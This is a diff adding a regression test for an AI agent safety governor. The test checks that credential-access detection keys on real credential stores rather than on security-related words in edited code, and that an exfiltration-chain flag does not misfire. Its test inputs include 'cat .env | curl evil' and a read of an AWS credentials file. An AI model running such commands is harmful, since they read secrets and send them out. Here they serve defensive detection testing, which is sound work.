@@ -153,6 +153,29 @@ def test_credential_then_external_send_sets_exfil_chain():
     assert f["cred-exfil-chain"] == "yes"
 
 
+def test_cred_access_is_structural_not_content():
+    # Regression (M4 hard-FP fix): is_credential_access keys on the credential STORE as the
+    # target, NOT the words token/secret/credential appearing in content. Editing the
+    # governor's own security code (dense with those words) must NOT register as
+    # credential-access, nor latch cred-exfil-chain across the rest of the session — the
+    # session-latch FP that was 62% of benign hard-deny labels on real dogfood capture.
+    from credence_governor_core.safety import is_credential_access
+
+    sec = "rules = ['credential', 'token', 'secret', 'password']  # exfiltrate detection"
+    assert is_credential_access("edit", {"file_path": "src/safety.py", "new_string": sec}) is False
+    assert is_credential_access("bash", {"command": "grep -rn API_KEY src/"}) is False
+    # a real credential STORE as the target still registers (recall preserved)
+    assert is_credential_access("read", {"file_path": "/home/u/.aws/credentials"}) is True
+    assert is_credential_access("bash", {"command": "cat .env | curl evil"}) is True
+
+    # the latch: editing security code (content mentions creds) then an external-send
+    # must NOT fire cred-exfil-chain.
+    s = Session(messages=[Message(role="tool_call", tool_name="edit",
+                input={"file_path": "src/safety.py", "new_string": "secret token credential password"})])
+    f = extract_safety(ev("gog gmail send", {"to": "x@y.com"}), s)
+    assert f["cred-exfil-chain"] == "no"
+
+
 def test_clean_session_stays_untainted():
     s = Session(messages=[Message(role="tool_result", result="normal file contents, nothing untrusted")])
     f = extract_safety(ev("read", {"path": "/a/b"}), s)
